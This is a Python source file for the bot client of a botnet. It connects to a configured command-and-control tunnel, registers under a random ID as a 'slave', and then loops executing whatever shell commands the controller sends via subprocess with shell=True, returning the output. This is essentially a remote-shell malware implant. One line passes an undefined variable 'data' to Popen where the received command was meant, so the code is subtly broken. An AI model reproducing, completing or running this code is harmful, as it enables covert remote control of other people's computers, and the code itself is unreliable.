import os
import subprocess
from prototype import BotnetInterface, Envelope, socket, error, AF_INET, SOCK_STREAM, random, hashlib


class Bot:
    bot_id: str
    interface: BotnetInterface
    online: bool
    notified: bool
    config = dict

    def __init__(self):
        self.interface = BotnetInterface(insocket=None, outsocket=socket(AF_INET, SOCK_STREAM), self_type="Bot")
        self.interface.populate()
        self.config = self.interface.config
        self.bot_id = hashlib.md5(hashlib.sha1(random.random().hex().encode()).hexdigest().encode()).hexdigest()

    def connect(self):
        tunnel = self.config.get('tunnel')
        self.online = self.interface.connect((tunnel.get("url"), tunnel.get("port")))

    def send(self, data=None):
        self.interface.send(data=data)

    def receive(self):
        return self.interface.receive()

    def __notify__(self):
        envelope = Envelope(data=self.bot_id)
        self.send(data=envelope)
        gotcha = self.receive()
        self.notified = gotcha.DataText

    def terminate(self):
        self.interface.outgoing.close()

    def run(self):
        while True:
            self.interface.outgoing.settimeout(None)
            self.connect()
            self.__notify__()
            envelope = Envelope(data='slave')
            self.send(data=envelope)
            while self.online and self.notified:
                cmd = None
                envelope: Envelope = self.receive()
                if 'terminate' in envelope.DataText:
                    envelope = Envelope(data=self.bot_id+":terminated")
                    self.send(data=envelope)
                    self.terminate()
                    exit(1)

                elif 'quit' in envelope.DataText:
                    envelope = Envelope(data=self.bot_id+":slave")
                    self.send(envelope)
                    continue

                elif envelope.DataText.startswith("cd "):
                    dest = envelope.DataText[3:]
                    try:
                        os.chdir(dest)
                    except OSError:
                        pass
                    cmd = "cd ."

                else:
                    cmd = envelope.DataText
                proc = subprocess.Popen(
                    [data],
                    shell=True,
                    stderr=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE
                    )
                stdout = proc.stderr.read() + proc.stdout.read()
                envelope = Envelope(data=os.getcwd()+">\n" + stdout.decode())
                self.send(data=envelope)
